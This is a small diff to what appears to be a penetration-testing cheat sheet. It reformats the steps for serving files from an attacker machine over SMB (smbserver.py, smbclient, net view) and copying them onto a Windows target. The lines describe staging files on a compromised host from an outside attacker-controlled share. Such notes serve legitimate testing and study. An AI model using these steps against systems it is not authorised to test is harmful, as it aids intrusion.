@@ -81,15 +81,15 @@ Type it into your cmd.exe
 
 **On attacker machine**:
 
-> smbserver.py shareName sharePath 
-> (e.g. smbserver.py TMP /tmp)
+> `smbserver.py shareName sharePath`
+> `(e.g. smbserver.py TMP /tmp)`
 
 Check with smbclient
-> smbclient -L \[your ip address\] --no-pass
+> `smbclient -L \[your ip address\] --no-pass`
 
 **On target machine**:
 or check on Windows
-> net view \\\\\[attack machine ip address\]
+> `net view \\\\\[attack machine ip address\]`
 
 Copy file 
 `copy \\[your ip address]\Sharepath .`
